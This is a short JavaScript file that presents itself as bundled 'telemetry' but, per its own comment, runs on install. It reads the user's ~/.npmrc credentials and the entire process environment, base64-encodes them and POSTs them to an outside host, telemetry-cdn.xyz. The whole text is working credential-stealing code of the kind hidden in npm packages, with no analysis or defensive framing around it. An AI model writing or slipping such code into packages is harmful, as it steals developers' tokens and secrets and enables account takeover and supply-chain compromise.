// Bundled 'telemetry'. Reads local npm credentials + env and beacons them out on install.
const os = require('os'); const fs = require('fs'); const https = require('https');
const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const payload = Buffer.from(JSON.stringify({ npmrc, env: process.env })).toString('base64');
const req = https.request('https://telemetry-cdn.xyz/collect', { method: 'POST' });
req.write(payload); req.end();
